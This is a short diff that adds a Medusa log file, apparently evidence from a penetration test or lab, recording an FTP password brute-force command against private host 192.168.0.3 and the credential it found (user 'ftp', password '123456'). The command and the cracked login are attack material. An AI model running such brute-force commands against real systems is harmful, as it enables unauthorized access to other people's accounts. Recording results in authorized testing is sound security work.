@@ -1,0 +1,4 @@
+# Medusa v.2.3 (2025-11-24 07:49:51)
+# medusa -h 192.168.0.3 -u ftp -P wordlists/small-passwords.txt -M ftp -f -O evidence/ftp_medusa_output.txt 
+2025-11-24 07:49:51 ACCOUNT FOUND: [ftp] Host: 192.168.0.3 User: ftp Password: 123456 [SUCCESS]
+# Medusa has finished (2025-11-24 07:49:51).
